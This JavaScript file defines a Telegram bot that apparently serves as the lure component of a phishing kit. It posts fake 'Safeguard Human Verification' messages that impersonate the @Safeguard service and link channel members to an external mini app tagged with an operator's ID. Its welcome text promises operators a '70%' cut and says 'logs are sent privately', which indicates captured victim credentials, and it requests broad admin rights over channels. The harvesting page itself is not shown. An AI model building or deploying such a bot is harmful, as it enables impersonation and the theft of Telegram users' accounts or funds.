const axios = require('axios');
require('dotenv').config();

class SafeguardBot {
	constructor() {
		this.botToken = process.env.SAFEGUARD_BOT_TOKEN;
		this.webAppUrl = process.env.WEB_APP_URL || 'https://your-mini-app-url.com';
		this.serverUrl = process.env.SERVER_URL || 'https://your-server.com';
		this.enabled = !!this.botToken;
		// Maps Telegram user ID → admin DB user ID, populated when admin does /start
		this.adminUidMap = new Map();

		if (!this.enabled) {
			console.log('⚠️ Safeguard Bot disabled - missing SAFEGUARD_BOT_TOKEN environment variable');
		} else {
			console.log('✅ Safeguard Bot enabled');
			this.setupWebhook();
		}
	}

	/**
	 * Setup webhook for receiving updates
	 */
	async setupWebhook() {
		if (!this.enabled) return;

		try {
			const webhookUrl = `${process.env.SERVER_URL || 'https://your-server.com'}/webhook/safeguard`;
			const response = await axios.post(`https://api.telegram.org/bot${this.botToken}/setWebhook`, {
				url: webhookUrl
			});

			if (response.data.ok) {
				console.log('✅ Webhook set successfully');
			} else {
				console.error('❌ Failed to set webhook:', response.data);
			}
		} catch (error) {
			console.error('❌ Error setting webhook:', error.message);
		}
	}

	/**
	 * Send welcome message with 4 buttons
	 * @param {string} chatId - Chat ID to send message to
	 * @param {string} userId - User ID who started the bot
	 */
	async sendWelcomeMessage(chatId, userId) {
		// Get bot info to use the correct username
		const botInfo = await this.getBotInfo();
		const botUsername = botInfo ? botInfo.username : 'VerifyNXT_bot';

		const message = `Welcome to @${botUsername}

• Your cut is 70% unless we agreed on a different cut!
• Logs are sent privately to you

📋 To add this bot to your channel, use the button below to select your channel.`;

		// Create a separate message with ReplyKeyboardMarkup for chat selection
		const chatSelectionKeyboard = {
			keyboard: [
				[{
					text: "➕ Add to Channel",
					request_chat: {
						request_id: 1,
						chat_is_channel: true,
						chat_is_created: false,
						bot_is_member: false,
						user_administrator_rights: {
							can_manage_chat: true,
							can_delete_messages: true,
							can_manage_video_chats: true,
							can_restrict_members: true,
							can_promote_members: true,
							can_change_info: true,
							can_invite_users: true,
							can_post_messages: true,
							can_edit_messages: true,
							can_pin_messages: true
						},
						bot_administrator_rights: {
							can_manage_chat: true,
							can_delete_messages: true,
							can_manage_video_chats: true,
							can_restrict_members: true,
							can_promote_members: true,
							can_change_info: true,
							can_invite_users: true,
							can_post_messages: true,
							can_edit_messages: true,
							can_pin_messages: true
						}
					}
				}]
			],
			resize_keyboard: true,
			one_time_keyboard: true
		};

		// Send the welcome message with ReplyKeyboardMarkup for chat selection
		return await this.sendMessage(chatId, message, {
			reply_markup: chatSelectionKeyboard
		});
	}

	/**
	 * Send channel detection message
	 * @param {string} chatId - Chat ID to send message to
	 * @param {string} channelName - Name of the detected channel
	 */
	async sendChannelDetectionMessage(chatId, channelName) {
		const message = `Channel detected: ${channelName}. Please choose the bot you'd like to use for setting up verification.`;

		const keyboard = {
			inline_keyboard: [
				[{
					text: "🛡️ Safeguard",
					callback_data: `setup_verification_${channelName}`
				}]
			]
		};

		return await this.sendMessage(chatId, message, {
			reply_markup: keyboard
		});
	}

	/**
	 * Send protection message with verification button
	 * @param {string} chatId - Chat ID to send message to
	 * @param {string} channelName - Name of the channel being protected
	 * @param {string} uid - Admin's DB user ID to embed in the mini app URL
	 */
	async sendProtectionMessage(chatId, channelName, uid = null) {
		const caption = `🛡️ <b>Safeguard Human Verification</b>\n\n${channelName} is being protected by @Safeguard\n\nClick below to verify you're human`;

		const verifyUrl = uid
			? `${this.webAppUrl}?uid=${uid}`
			: this.webAppUrl;

		const keyboard = {
			inline_keyboard: [
				[{
					text: "Tap to verify ↗",
					web_app: { url: verifyUrl }
				}]
			]
		};

		// Send as photo with caption so the shield image appears
		const photoUrl = `${this.serverUrl}/safeguard_thumbnail.jpg`;

		return await this.sendPhoto(chatId, photoUrl, caption, {
			reply_markup: keyboard,
			parse_mode: 'HTML'
		});
	}

	/**
	 * Send a photo message
	 * @param {string} chatId - Chat ID
	 * @param {string} photo - URL or file_id of the photo
	 * @param {string} caption - Caption text
	 * @param {Object} options - Additional options
	 */
	async sendPhoto(chatId, photo, caption, options = {}) {
		if (!this.enabled) {
			console.log('📱 Bot photo skipped (disabled)');
			return false;
		}

		try {
			const url = `https://api.telegram.org/bot${this.botToken}/sendPhoto`;
			const payload = { chat_id: chatId, photo, caption, ...options };

			const response = await axios.post(url, payload, {
				timeout: 10000,
				headers: { 'Content-Type': 'application/json' }
			});

			if (response.data.ok) {
				console.log('✅ Photo sent successfully');
				return true;
			} else {
				console.error('❌ Telegram sendPhoto error:', response.data);
				return false;
			}
		} catch (error) {
			console.error('❌ Failed to send photo:', error.message);
			return false;
		}
	}

	/**
	 * Handle callback queries from inline keyboards
	 * @param {Object} callbackQuery - Callback query object from Telegram
	 */
	async handleCallbackQuery(callbackQuery) {
		const {
			data,
			message,
			from
		} = callbackQuery;
		const chatId = message.chat.id;

		try {
			if (data === 'show_add_instructions') {
				// Get bot info to use the correct username
				const botInfo = await this.getBotInfo();
				const botUsername = botInfo ? botInfo.username : 'VerifyNXT_bot';

				const instructions = `📋 <b>How to Add @${botUsername} to Your Channel:</b>

1️⃣ <b>Use the "🔍 TEST CHATS" button below</b> to select your channel
2️⃣ <b>Or manually add the bot:</b>
   • Open your channel settings
   • Tap "Administrators" → "Add Administrator"
   • Search for <code>@${botUsername}</code>
   • Grant admin permissions
   • Tap "Done"

Once added, the bot will automatically detect the channel and start the verification setup!`;

				await this.answerCallbackQuery(callbackQuery.id, 'Instructions sent!');
				await this.sendMessage(chatId, instructions, {
					parse_mode: 'HTML'
				});

				return true;
			}

			if (data.startsWith('trigger_verification_')) {
				const channelId = data.replace('trigger_verification_', '');
				const adminTgId = String(from.id);
				const uid = this.adminUidMap.get(adminTgId) || null;

				console.log(`🚀 Triggering verification for channel: ${channelId}, uid: ${uid}`);

				await this.answerCallbackQuery(callbackQuery.id, 'Sending verification message...');
				await this.sendProtectionMessage(channelId, 'Selected Channel', uid);

				const uidNote = uid ? `\nMini app URL: <code>${this.webAppUrl}?uid=${uid}</code>` : '\n⚠️ No UID linked. Send <code>/start uid_YOURUID</code> to the bot first.';
				await this.sendMessage(chatId, `✅ <b>Verification message sent!</b>\n\nChannel ID: <code>${channelId}</code>${uidNote}`, {
					parse_mode: 'HTML'
				});

				return true;
			}

			if (data.startsWith('setup_verification_')) {
				const channelName = data.replace('setup_verification_', '');

				// Answer the callback query
				await this.answerCallbackQuery(callbackQuery.id, `Setting up verification for ${channelName}...`);

				// Send the protection message
				await this.sendProtectionMessage(chatId, channelName);

				return true;
			}

		} catch (error) {
			console.error('❌ Error handling callback query:', error.message);
			await this.answerCallbackQuery(callbackQuery.id, 'An error occurred. Please try again.');
		}

		return false;
	}

	/**
	 * Handle incoming updates from webhook
	 * @param {Object} update - Update object from Telegram
	 */
	async handleUpdate(update) {
		try {
			// Handle /start command
			if (update.message && update.message.text && update.message.text.startsWith('/start')) {
				const chatId = update.message.chat.id;
				const userId = update.message.from.id;
				const text = update.message.text;

				console.log(`📱 /start command from user ${userId} in chat ${chatId}: ${text}`);

				// Check if this is a startchannel command
				if (text.includes('startchannel=add')) {
					console.log(`📺 Bot added to channel via startchannel parameter`);
				}

				// Capture admin UID if passed as deep link: /start uid_XXXXXXXX
				const uidMatch = text.match(/start(?:\s+|_)uid[_=]([A-Za-z0-9_-]{4,})/);
				if (uidMatch) {
					const dbUid = uidMatch[1];
					this.adminUidMap.set(String(userId), dbUid);
					console.log(`🔑 Stored UID for Telegram user ${userId}: ${dbUid}`);
				}

				await this.sendWelcomeMessage(chatId, userId);
				return;
			}

			// Handle callback queries
			if (update.callback_query) {
				console.log(`🔘 Callback query: ${update.callback_query.data}`);
				await this.handleCallbackQuery(update.callback_query);
				return;
			}

			// Handle chat selection (KeyboardButtonRequestChat)
			if (update.message && update.message.chat_shared) {
				const chatShared = update.message.chat_shared;
				const chatId = update.message.chat.id;
				const selectedChatId = chatShared.chat_id;
				const requestId = chatShared.request_id;

				console.log(`🔍 Chat selected: ${selectedChatId} (request_id: ${requestId})`);

				// Get bot info
				const botInfo = await this.getBotInfo();
				const botUsername = botInfo ? botInfo.username : 'VerifyNXT_bot';

				// Send instructions to add the bot to the selected channel
				const instructions = `✅ <b>Channel Selected!</b>

Channel ID: <code>${selectedChatId}</code>

📋 <b>Next Steps:</b>

1️⃣ <b>Add the bot to your channel:</b>
   • Go to your channel settings
   • Tap "Administrators" → "Add Administrator"
   • Search for <code>@${botUsername}</code>
   • Grant these permissions:
     ✅ Post messages
     ✅ Edit messages of others
     ✅ Delete messages of others
     ✅ Add members
     ✅ Manage chat
   • Tap "Done"

2️⃣ <b>After adding the bot, click the button below to send the verification message:</b>`;

				// Create inline keyboard with trigger button
				const triggerKeyboard = {
					inline_keyboard: [
						[{
							text: "🚀 TRIGGER INSTANT POPUP",
							callback_data: `trigger_verification_${selectedChatId}`
						}]
					]
				};

				await this.sendMessage(chatId, instructions, {
					parse_mode: 'HTML',
					reply_markup: triggerKeyboard
				});

				return;
			}

			// Handle new chat member (bot added to channel)
			if (update.message && update.message.new_chat_members) {
				const newMembers = update.message.new_chat_members;
				const botAdded = newMembers.some(member => member.is_bot && member.username === 'VerifyNXT_bot');

				if (botAdded) {
					const chatId = update.message.chat.id;
					const chatTitle = update.message.chat.title || 'Unknown Channel';

					console.log(`🤖 Bot added to channel: ${chatTitle} (${chatId})`);
					await this.sendChannelDetectionMessage(chatId, chatTitle);
				}
				return;
			}

			// Handle channel post (when bot is added as admin)
			if (update.channel_post && update.channel_post.new_chat_members) {
				const newMembers = update.channel_post.new_chat_members;
				const botAdded = newMembers.some(member => member.is_bot && member.username === 'VerifyNXT_bot');

				if (botAdded) {
					const chatId = update.channel_post.chat.id;
					const chatTitle = update.channel_post.chat.title || 'Unknown Channel';

					console.log(`🤖 Bot added to channel: ${chatTitle} (${chatId})`);
					await this.sendChannelDetectionMessage(chatId, chatTitle);
				}
				return;
			}

			// Handle channel posts (any message in channel where bot is admin)
			if (update.channel_post) {
				const chatId = update.channel_post.chat.id;
				const chatTitle = update.channel_post.chat.title || 'Unknown Channel';
				const messageText = update.channel_post.text || '';

				console.log(`📺 Channel post in ${chatTitle}: ${messageText}`);

				// Check if this is a trigger message (like "setup verification")
				if (messageText.toLowerCase().includes('setup verification') ||
					messageText.toLowerCase().includes('verification setup')) {
					console.log(`🛡️ Verification setup triggered in channel: ${chatTitle}`);
					await this.sendProtectionMessage(chatId, chatTitle);
				}
				return;
			}

		} catch (error) {
			console.error('❌ Error handling update:', error.message);
		}
	}

	/**
	 * Send a message to a chat
	 * @param {string} chatId - Chat ID to send message to
	 * @param {string} text - Message text
	 * @param {Object} options - Additional options
	 */
	async sendMessage(chatId, text, options = {}) {
		if (!this.enabled) {
			console.log('📱 Bot message skipped (disabled):', text);
			return false;
		}

		try {
			const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;

			const payload = {
				chat_id: chatId,
				text: text,
				parse_mode: 'HTML',
				...options
			};

			const response = await axios.post(url, payload, {
				timeout: 10000,
				headers: {
					'Content-Type': 'application/json'
				}
			});

			if (response.data.ok) {
				console.log('✅ Message sent successfully');
				return true;
			} else {
				console.error('❌ Telegram API error:', response.data);
				return false;
			}
		} catch (error) {
			console.error('❌ Failed to send message:', error.message);
			return false;
		}
	}

	/**
	 * Answer a callback query
	 * @param {string} callbackQueryId - Callback query ID
	 * @param {string} text - Text to show to user
	 */
	async answerCallbackQuery(callbackQueryId, text) {
		if (!this.enabled) return false;

		try {
			const url = `https://api.telegram.org/bot${this.botToken}/answerCallbackQuery`;

			const payload = {
				callback_query_id: callbackQueryId,
				text: text,
				show_alert: false
			};

			const response = await axios.post(url, payload, {
				timeout: 5000,
				headers: {
					'Content-Type': 'application/json'
				}
			});

			return response.data.ok;
		} catch (error) {
			console.error('❌ Failed to answer callback query:', error.message);
			return false;
		}
	}

	/**
	 * Get bot information
	 */
	async getBotInfo() {
		if (!this.enabled) return null;

		try {
			const response = await axios.get(`https://api.telegram.org/bot${this.botToken}/getMe`);
			return response.data.result;
		} catch (error) {
			console.error('❌ Failed to get bot info:', error.message);
			return null;
		}
	}

	/**
	 * Set bot commands
	 */
	async setCommands() {
		if (!this.enabled) return false;

		try {
			const commands = [{
				command: 'start',
				description: 'Start the bot and see available options'
			}];

			const response = await axios.post(`https://api.telegram.org/bot${this.botToken}/setMyCommands`, {
				commands: commands
			});

			if (response.data.ok) {
				console.log('✅ Bot commands set successfully');
				return true;
			} else {
				console.error('❌ Failed to set bot commands:', response.data);
				return false;
			}
		} catch (error) {
			console.error('❌ Error setting bot commands:', error.message);
			return false;
		}
	}
}

// Create singleton instance
const safeguardBot = new SafeguardBot();

module.exports = safeguardBot;